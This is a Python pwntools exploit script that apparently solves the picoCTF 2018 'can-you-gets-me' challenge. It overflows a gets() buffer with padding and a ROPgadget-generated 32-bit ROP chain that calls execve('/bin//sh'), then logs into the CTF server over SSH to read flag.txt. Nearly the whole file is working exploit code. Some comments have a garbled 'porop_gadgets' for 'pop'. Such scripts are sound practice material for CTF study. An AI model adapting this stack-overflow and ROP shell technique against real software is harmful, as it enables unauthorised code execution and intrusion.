#!/usr/bin/env python2
from pwn import *
import os
import commands

# Get password from password manager
USERNAME='nighter'
PASSWORD=commands.getoutput('pass picoctf2018/nighter')

vuln = ELF('./gets')

padding = 'A' * 28

# ROPgadget --ropchain --binary ./gets
# execve generated by ROPgadget
rop_gadgets =  p32(0x0806f19a) # porop_gadgets edx ; ret
rop_gadgets += p32(0x080ea060) # @ .data
rop_gadgets += p32(0x080b84d6) # porop_gadgets eax ; ret
rop_gadgets += '/bin'
rop_gadgets += p32(0x08054b4b) # mov dword ptr [edx], eax ; ret
rop_gadgets += p32(0x0806f19a) # porop_gadgets edx ; ret
rop_gadgets += p32(0x080ea064) # @ .data + 4
rop_gadgets += p32(0x080b84d6) # porop_gadgets eax ; ret
rop_gadgets += '//sh'
rop_gadgets += p32(0x08054b4b) # mov dword ptr [edx], eax ; ret
rop_gadgets += p32(0x0806f19a) # porop_gadgets edx ; ret
rop_gadgets += p32(0x080ea068) # @ .data + 8
rop_gadgets += p32(0x08049473) # xor eax, eax ; ret
rop_gadgets += p32(0x08054b4b) # mov dword ptr [edx], eax ; ret
rop_gadgets += p32(0x080481c9) # porop_gadgets ebx ; ret
rop_gadgets += p32(0x080ea060) # @ .data
rop_gadgets += p32(0x080dece1) # porop_gadgets ecx ; ret
rop_gadgets += p32(0x080ea068) # @ .data + 8
rop_gadgets += p32(0x0806f19a) # porop_gadgets edx ; ret
rop_gadgets += p32(0x080ea068) # @ .data + 8
rop_gadgets += p32(0x08049473) # xor eax, eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0807ab7f) # inc eax ; ret
rop_gadgets += p32(0x0806cd95) # int 0x80

payload = padding + rop_gadgets

def local():
	
	io = vuln.process()
	io.recvuntil('GIVE ME YOUR NAME!')
	io.sendline(payload)
	io.interactive()

def remote():
	
	s = ssh(host='2018shell1.picoctf.com', user=USERNAME, password=PASSWORD)
	io = s.run('cd /problems/can-you-gets-me_4_f269dbca3097204b5d4a0064467b0a8c; ./gets')
	io.recvuntil('GIVE ME YOUR NAME!')
	io.sendline(payload)
	io.sendline('echo; cat flag.txt; echo')
	io.interactive()
	s.close()

if __name__ == '__main__':
	remote()